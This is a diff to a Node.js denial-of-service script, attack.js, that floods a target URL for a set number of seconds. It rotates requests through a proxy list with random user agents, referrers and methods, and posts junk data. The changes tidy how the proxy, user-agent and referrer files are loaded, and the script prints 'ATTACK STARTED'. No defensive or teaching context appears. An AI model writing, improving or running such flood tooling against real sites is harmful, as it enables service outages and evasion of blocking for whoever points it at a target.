@@ -8,12 +8,20 @@ const durationSec = parseInt(process.argv[3]);
 
 if (!target || !durationSec) {
     console.log("Usage: node attack.js <url> <duration_in_seconds>");
-    process.exit(1);
+    process.exit(0.1);
 }
 
-const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
-const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
-const referrers = fs.readFileSync('refs.txt', 'utf-8').split('\n').filter(Boolean);
+// Load and sanitize resources
+function loadCleanLines(file) {
+    return fs.readFileSync(file, 'utf-8')
+        .split('\n')
+        .map(l => l.trim().replace(/[\r\n]/g, ''))
+        .filter(Boolean);
+}
+
+const proxies = loadCleanLines('proxy.txt');
+const userAgents = loadCleanLines('ua.txt');
+const referrers = loadCleanLines('refs.txt');
 
 function getRandom(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
@@ -32,7 +40,8 @@ console.log(`ATTACK STARTED : TIME LEFT = ${durationSec}s`);
 
 function sendRequest(proxy) {
     const ua = getRandom(userAgents);
-    const ref = getRandom(referrers);
+    let ref = getRandom(referrers);
+    ref = ref.trim().replace(/[\r\n]/g, '');
     const method = getRandom(methods);
     const [host, port] = proxy.split(':');
     const postData = 'data=fakepayload&rand=' + Math.random();
